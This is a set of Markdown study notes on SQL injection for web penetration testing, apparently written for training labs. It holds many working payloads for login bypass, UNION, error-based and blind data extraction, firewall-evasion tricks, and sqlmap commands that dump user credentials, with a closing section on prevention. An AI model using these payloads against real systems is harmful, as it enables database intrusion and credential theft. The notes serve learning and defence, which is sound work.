# SQL Injection — Complete Study Notes

> **Scope:** Web Application Penetration Testing  
> **Platform:** PortSwigger Web Security Academy, DVWA, bWAPP  
> **Tools:** Burp Suite, SQLmap, Browser DevTools  

---

## Table of Contents

1. [Authentication Bypass](#1-authentication-bypass)
2. [Enumeration](#2-enumeration)
3. [UNION-Based SQL Injection](#3-union-based-sql-injection)
4. [Error-Based SQL Injection](#4-error-based-sql-injection)
5. [Blind SQL Injection](#5-blind-sql-injection)
6. [Filter / WAF Bypass](#6-filter--waf-bypass)
7. [Automation — SQLmap](#7-automation--sqlmap)
8. [Remediation / Prevention](#8-remediation--prevention)

---

## 1. Authentication Bypass

### Concept
Authentication bypass exploits SQL injection in login forms to skip password verification entirely by manipulating the underlying SQL query logic.

### Typical Vulnerable Query
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```

### Common Payloads

| Payload | Injected Into | Effect |
|---|---|---|
| `' OR '1'='1` | username | Always true condition |
| `' OR 1=1--` | username | Comments out password check |
| `admin'--` | username | Logs in as admin, ignores password |
| `' OR 'x'='x` | username or password | Always evaluates to true |
| `') OR ('1'='1` | username (with parentheses) | Closes bracket, forces true |

### How It Works
```
Original:  WHERE username = ''     AND password = 'anything'
Injected:  WHERE username = '' OR 1=1--' AND password = 'anything'
Result:    WHERE username = '' OR 1=1   ← password check ignored
```

### Key Points
- `--` and `#` are MySQL comment operators — everything after is ignored
- `' OR 1=1--` turns the WHERE clause always true → returns all rows → logs in as first user (often admin)
- Works only when app uses the returned row count (e.g., `if rows > 0: login success`)

---

## 2. Enumeration

### 2.1 Column Count Detection

**Purpose:** Before running UNION attack, exact column count of the original query must be known.

#### Method 1 — ORDER BY

```sql
' ORDER BY 1--    ← no error
' ORDER BY 2--    ← no error
' ORDER BY 3--    ← no error
' ORDER BY 4--    ← ERROR → column count is 3
```

> Increment the number until an error appears. Last non-error number = column count.

#### Method 2 — NULL-based UNION

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   ← no error = 3 columns
```

> `NULL` is used instead of values because NULL is compatible with all data types — avoids type mismatch errors.

---

### 2.2 Database Version Detection

**Purpose:** Identifying the DBMS version helps choose the right syntax, functions, and exploitation technique.

#### Syntax by Database

| Database | Version Query |
|---|---|
| MySQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MSSQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |

#### Via UNION
```sql
' UNION SELECT NULL,@@version,NULL--
```

#### Via Error-Based (MySQL)
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--
' AND UPDATEXML(1, CONCAT(0x7e, @@version), 1)--
```

#### Via Blind (Boolean)
```sql
' AND SUBSTRING(@@version,1,1)='5'--    ← true if MySQL 5.x
' AND SUBSTRING(@@version,1,1)='8'--    ← true if MySQL 8.x
```

---

## 3. UNION-Based SQL Injection

### Concept
UNION attack appends a second SELECT query to the original. The result of the injected query is returned alongside (or instead of) the original result — data is visible in the HTTP response.

### Requirements
- Column count must match exactly
- Data types must be compatible (use NULL for unknown columns)

---

### 3.1 Output Column Discovery

Find which columns are displayed in the response (some columns may not be rendered):

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

The column that shows `a` in the response is the **visible column** — inject data there.

---

### 3.2 Database Enumeration

```sql
-- Current database name
' UNION SELECT NULL,database(),NULL--

-- Current user
' UNION SELECT NULL,user(),NULL--

-- Database version
' UNION SELECT NULL,@@version,NULL--

-- Hostname
' UNION SELECT NULL,@@hostname,NULL--

-- All databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
```

---

### 3.3 Table Enumeration

```sql
-- All tables in current database
' UNION SELECT NULL,table_name,NULL 
  FROM information_schema.tables 
  WHERE table_schema=database()--

-- All tables in specific database
' UNION SELECT NULL,table_name,NULL 
  FROM information_schema.tables 
  WHERE table_schema='target_db'--
```

---

### 3.4 Column Enumeration

```sql
-- Columns of a specific table
' UNION SELECT NULL,column_name,NULL 
  FROM information_schema.columns 
  WHERE table_name='users'--
```

---

### 3.5 Data Extraction

```sql
-- Extract single column
' UNION SELECT NULL,username,NULL FROM users--

-- Extract multiple columns concatenated
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--

-- With LIMIT for row control
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users LIMIT 0,1--
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users LIMIT 1,1--
```

### UNION Attack Flow Summary
```
Step 1 → Find column count       : ORDER BY / NULL method
Step 2 → Find visible column     : inject 'a' into each column
Step 3 → Enumerate databases     : information_schema.schemata
Step 4 → Enumerate tables        : information_schema.tables
Step 5 → Enumerate columns       : information_schema.columns
Step 6 → Extract data            : SELECT target_column FROM target_table
```

---

## 4. Error-Based SQL Injection

### Concept
Force the database to throw a verbose error that contains query output embedded inside the error message. Works when the application displays database errors in the HTTP response.

---

### 4.1 EXTRACTVALUE()

```sql
-- Basic syntax
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--

-- Extract version
' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--

-- Extract table names
' AND EXTRACTVALUE(1, CONCAT(0x7e, (
    SELECT table_name FROM information_schema.tables 
    WHERE table_schema=database() LIMIT 0,1
)))--

-- Iterate rows with LIMIT offset
LIMIT 0,1  → first row
LIMIT 1,1  → second row
LIMIT 2,1  → third row
```

> `0x7e` = `~` (tilde) — used as a separator so data is clearly visible in error output.

---

### 4.2 UPDATEXML()

```sql
-- Basic syntax
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)--

-- Extract current user
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)--

-- Extract table name
' AND UPDATEXML(1, CONCAT(0x7e, (
    SELECT table_name FROM information_schema.tables 
    WHERE table_schema=database() LIMIT 0,1
)), 1)--
```

---

### 4.3 FLOOR + RAND (GROUP BY Error)

```sql
' AND (SELECT 1 FROM (
    SELECT COUNT(*), CONCAT(
        (SELECT database()), 0x3a, FLOOR(RAND(0)*2)
    ) x FROM information_schema.tables GROUP BY x
) a)--
```

> Triggers duplicate entry error — embeds query output inside the error message.

---

### 4.4 CASE WHEN + Divide by Zero

```sql
' AND CASE WHEN (1=1) THEN 1/0 ELSE 1 END--    ← triggers divide-by-zero if true
' AND CASE WHEN (1=2) THEN 1/0 ELSE 1 END--    ← no error if false
```

---

### 4.5 GROUP_CONCAT Extraction

Extract multiple values in one shot (avoids LIMIT iteration):

```sql
-- All table names at once
' AND EXTRACTVALUE(1, CONCAT(0x7e, (
    SELECT GROUP_CONCAT(table_name SEPARATOR ', ') 
    FROM information_schema.tables 
    WHERE table_schema=database()
)))--

-- All column names of a table
' AND EXTRACTVALUE(1, CONCAT(0x7e, (
    SELECT GROUP_CONCAT(column_name SEPARATOR ', ') 
    FROM information_schema.columns 
    WHERE table_name='users'
)))--
```

> **Note:** Output is limited to ~32 characters in MySQL error messages. Use `SUBSTRING()` for longer output.

---

## 5. Blind SQL Injection

### Concept
The application does **not** display query results or errors in the response. Instead, behavior differences (page content, response time) are used to infer data one bit at a time.

---

### 5.1 Boolean-Based Blind SQLi

Application returns different content (or nothing) based on whether the condition is TRUE or FALSE.

#### Detection
```sql
' AND 1=1--    ← TRUE  → normal page loads
' AND 1=2--    ← FALSE → different/empty response
```

#### Data Extraction via SUBSTRING + ASCII

```sql
-- Extract first character of database name
' AND SUBSTRING(database(),1,1)='a'--    ← test each letter
' AND ASCII(SUBSTRING(database(),1,1))>96--
' AND ASCII(SUBSTRING(database(),1,1))=100--   ← 'd' = 100

-- Extract username character by character
' AND SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='a'--
```

#### LENGTH check first (optimizes extraction)
```sql
' AND LENGTH(database())=8--    ← confirm length before extracting
```

#### Extraction Logic Table

| Position | Payload | True Response | False Response |
|---|---|---|---|
| DB name char 1 | `SUBSTRING(database(),1,1)='s'` | Normal page | Blank/error |
| DB name char 2 | `SUBSTRING(database(),2,1)='e'` | Normal page | Blank/error |
| Username char 1 | `SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='a'` | Normal page | Blank/error |

---

### 5.2 Conditional Errors (Error-Based Blind)

No visible output, but server returns **HTTP 500** when condition is TRUE and **HTTP 200** when FALSE.

```sql
-- MySQL
' AND IF(1=1, 1/0, 1)--       ← TRUE  → 500 error (divide by zero)
' AND IF(1=2, 1/0, 1)--       ← FALSE → 200 OK

-- Extract data via conditional error
' AND IF(SUBSTRING(database(),1,1)='s', 1/0, 1)--

-- PostgreSQL equivalent
' AND CASE WHEN (1=1) THEN CAST(1/0 AS INT) ELSE 1 END--
```

---

### 5.3 Time-Based Blind SQLi

No visible difference in page content — inject **deliberate delay** to infer TRUE/FALSE.

#### Core Functions

| Database | Sleep Function | Syntax |
|---|---|---|
| MySQL | `SLEEP(n)` | `SLEEP(5)` = 5 second delay |
| PostgreSQL | `pg_sleep(n)` | `pg_sleep(5)` |
| MSSQL | `WAITFOR DELAY` | `WAITFOR DELAY '0:0:5'` |
| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message(('a'),5)` |

#### MySQL Payloads
```sql
-- Detection
' AND SLEEP(5)--                           ← 5s delay = injectable

-- Conditional delay (TRUE = delay, FALSE = instant)
' AND IF(1=1, SLEEP(5), 0)--              ← TRUE  → delays 5s
' AND IF(1=2, SLEEP(5), 0)--              ← FALSE → instant

-- Extract database name character by character
' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),2,1)='e', SLEEP(5), 0)--

-- Extract username
' AND IF(
    SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='a',
    SLEEP(5), 0
)--

-- Extract via ASCII (binary search approach)
' AND IF(ASCII(SUBSTRING(database(),1,1))>109, SLEEP(5), 0)--
```

#### Interpretation
```
Response takes 5+ seconds → condition is TRUE
Response is instant        → condition is FALSE
```

#### Time-Based Extraction Strategy
```
Goal: extract database() = "securedb"

Step 1: Find length
  IF(LENGTH(database())=8, SLEEP(5), 0) → 5s delay → length is 8

Step 2: Extract char by char
  IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0) → 5s → char 1 = 's'
  IF(SUBSTRING(database(),2,1)='e', SLEEP(5), 0) → 5s → char 2 = 'e'
  ... repeat for all 8 characters
```

> **Tip:** Use Burp Intruder with a character list + response time filter to automate this manually.

---

## 6. Filter / WAF Bypass

### Concept
Web Application Firewalls (WAF) and input filters block known SQL keywords like `SELECT`, `UNION`, `OR`, `AND`. Bypass techniques obfuscate payloads to evade detection while keeping them functionally valid.

---

### 6.1 SQL Comments

Comments break keyword detection without affecting query execution.

```sql
-- Standard inline comment (MySQL, MSSQL)
' UNION/**/SELECT/**/NULL,NULL--

-- MySQL-specific version comment (executes in MySQL, ignored in others)
' UNION/*!SELECT*/NULL,NULL--
' /*!UNION*/ /*!SELECT*/ NULL--

-- Nested comment trick
' UN/**/ION SE/**/LECT NULL--
```

---

### 6.2 Case Variation

Many WAFs are case-sensitive.

```sql
' uNiOn SeLeCt NULL,NULL--
' UnIoN SeLeCt NULL,NULL--
' UNION select NULL,NULL--
```

---

### 6.3 Encoding

URL-encode or hex-encode characters to bypass string matching.

```sql
-- URL encoding
%27 = '
%20 = space
%23 = #

-- Double URL encoding
%2527 = ' (decoded twice)

-- Hex encoding of string literals
WHERE table_name = 0x7573657273    ← hex for 'users'

-- Bypass quote filter
' UNION SELECT NULL,0x61646d696e,NULL--   ← 0x61646d696e = 'admin'
```

---

### 6.4 Keyword Splitting

Break blocked keywords using comments or special characters mid-word.

```sql
' UN/**/ION SEL/**/ECT NULL,NULL--
' UNIO%0aN SEL%0aECT NULL,NULL--    ← %0a = newline
```

---

### 6.5 Alternative Operators

Replace blocked operators with functional equivalents.

| Blocked | Alternative | Example |
|---|---|---|
| `OR` | `\|\|` | `'1'\|\|'1'` |
| `AND` | `&&` | `1&&1` |
| `=` | `LIKE` | `username LIKE 'admin'` |
| `=` | `REGEXP` | `username REGEXP 'admin'` |
| `space` | `/**/` | `UNION/**/SELECT` |
| `space` | `%09` (tab) | `UNION%09SELECT` |
| `space` | `%0a` (newline) | `UNION%0aSELECT` |
| `UNION SELECT` | `UNION ALL SELECT` | avoids DISTINCT-based filters |

---

### 6.6 WAF Bypass Cheat Reference

```sql
-- If SLEEP() is blocked (MySQL time-based)
' AND BENCHMARK(10000000, MD5(1))--

-- If quotes are filtered
' UNION SELECT NULL,CHAR(97,100,109,105,110),NULL--   ← CHAR() = 'admin'

-- If spaces are filtered
'/**/UNION/**/SELECT/**/NULL,NULL--

-- If = is filtered
' OR username LIKE 'admin'--
```

---

## 7. Automation — SQLmap

### Concept
SQLmap is an open-source tool that automates SQL injection detection and exploitation — supports all injection types (UNION, Error, Boolean, Time-based), all major databases.

---

### Installation & Update
```bash
sudo apt update && sudo apt install sqlmap   # Kali Linux
sqlmap --update                               # Update to latest version
sqlmap --version
```

---

### Basic Usage

```bash
# Test a URL parameter
sqlmap -u "http://target.com/page.php?id=1"

# POST request
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# With cookies (authenticated session)
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Using Burp Suite captured request file
sqlmap -r request.txt
```

---

### Enumeration Flags

```bash
# Current database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Current user
sqlmap -u "http://target.com/page.php?id=1" --current-user

# All databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Tables in a database
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables

# Columns in a table
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --columns

# Dump table data
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump
```

---

### Technique Control

```bash
--technique=U     # UNION only
--technique=E     # Error-based only
--technique=B     # Boolean-based blind only
--technique=T     # Time-based blind only
--technique=BEUST # All techniques
```

---

### Evasion Options

```bash
--level=5            # 1-5, increase tests (default: 1)
--risk=3             # 1-3, increase risk of payloads (default: 1)
--random-agent       # Use random User-Agent header
--tor                # Route through Tor
--delay=2            # Delay between requests (seconds)
--tamper=space2comment            # Replace spaces with /**/
--tamper=between                  # Replace = with BETWEEN
--tamper=randomcase               # Random case on SQL keywords
--tamper=charencode               # URL encode characters
--tamper=space2comment,randomcase # Chain multiple tampers
```

---

### Common SQLmap Workflow

```bash
# Step 1: Detect injection point
sqlmap -u "http://target.com/page.php?id=1" --batch

# Step 2: Get databases
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# Step 3: Get tables
sqlmap -u "http://target.com/page.php?id=1" -D mydb --tables --batch

# Step 4: Dump credentials
sqlmap -u "http://target.com/page.php?id=1" -D mydb -T users --dump --batch
```

> `--batch` = auto-confirm all prompts (non-interactive mode)

---

## 8. Remediation / Prevention

### 8.1 Prepared Statements (Most Effective)

Prepared statements separate SQL code from user data — the query structure is compiled first, then user input is passed as a parameter. No concatenation = no injection.

```php
// ❌ VULNERABLE — string concatenation
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "'";

// ✅ SAFE — prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['user']]);
```

```python
# ✅ Python (sqlite3)
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))

# ✅ Python (MySQL)
cursor.execute("SELECT * FROM users WHERE username = %s", (user_input,))
```

---

### 8.2 Parameterized Queries

Same concept as prepared statements — use placeholders instead of string building.

```java
// ✅ Java (JDBC)
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?"
);
stmt.setString(1, userInput);
```

```csharp
// ✅ C# (.NET)
SqlCommand cmd = new SqlCommand(
    "SELECT * FROM users WHERE username = @user", conn
);
cmd.Parameters.AddWithValue("@user", userInput);
```

---

### 8.3 Input Validation & Sanitization

Never rely on this alone — use as **defense in depth** alongside prepared statements.

```php
// Whitelist validation — only allow expected characters
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid input");
}

// Type casting for numeric inputs
$id = (int) $_GET['id'];   // Forces integer — strips all SQL characters

// Escape as last resort (not recommended as primary defense)
$safe = mysqli_real_escape_string($conn, $user_input);
```

---

### 8.4 Least Privilege Database User

Limit what damage can be done even if injection occurs.

| Principle | Implementation |
|---|---|
| Read-only app user | `GRANT SELECT ON db.* TO 'app_user'@'localhost'` |
| No DROP/ALTER/CREATE | Never grant DDL permissions to app DB user |
| Separate DB per app | Each application has its own isolated database |
| No `root` / `sa` in app | Application never connects as DB admin user |
| Stored procedure only | App user only has EXECUTE permission |

```sql
-- Create restricted app user (MySQL)
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'webapp'@'localhost';
-- No DELETE, DROP, CREATE, ALTER, FILE, SUPER permissions
FLUSH PRIVILEGES;
```

---

### 8.5 Defense Summary Table

| Layer | Method | Effectiveness |
|---|---|---|
| Code | Prepared Statements / Parameterized Queries | ⭐⭐⭐⭐⭐ Primary defense |
| Code | ORM (SQLAlchemy, Hibernate, Eloquent) | ⭐⭐⭐⭐⭐ Abstraction layer |
| Input | Whitelist input validation | ⭐⭐⭐⭐ Defense in depth |
| Input | Type casting for numeric inputs | ⭐⭐⭐⭐ Defense in depth |
| DB | Least privilege DB user | ⭐⭐⭐⭐ Limits damage |
| Infra | WAF (ModSecurity, Cloudflare) | ⭐⭐⭐ Bypassable — not primary |
| Infra | Error suppression (hide DB errors) | ⭐⭐ Reduces info leakage |

---

## Quick Reference — Injection Type Comparison

| Type | Visibility | Technique | Speed | Difficulty |
|---|---|---|---|---|
| UNION-Based | Full output in response | Append SELECT | Fast | Medium |
| Error-Based | Output in error message | Force DB error | Fast | Medium |
| Boolean-Based Blind | Page behavior (true/false) | Char by char | Slow | High |
| Time-Based Blind | Response delay | SLEEP/BENCHMARK | Very slow | High |
| Conditional Error Blind | HTTP status code | IF + divide/0 | Slow | High |

---

## Key Functions Reference

```sql
database()          -- current database name
user()              -- current DB user
@@version           -- database version
@@hostname          -- server hostname
SLEEP(n)            -- delay n seconds (MySQL)
SUBSTRING(str,pos,len) -- extract substring
ASCII(char)         -- ASCII value of character
CHAR(n)             -- character from ASCII value
LENGTH(str)         -- string length
CONCAT(a,b)         -- concatenate strings
GROUP_CONCAT(col)   -- concatenate all rows of a column
EXTRACTVALUE(x,y)   -- triggers XML error with data
UPDATEXML(x,y,z)    -- triggers XML error with data
IF(cond,true,false) -- conditional expression
BENCHMARK(n,expr)   -- repeat expression n times (CPU load)
```

---

*Notes maintained by: Rasel Hossain | Web Application Security | github.com/raselhossain79*
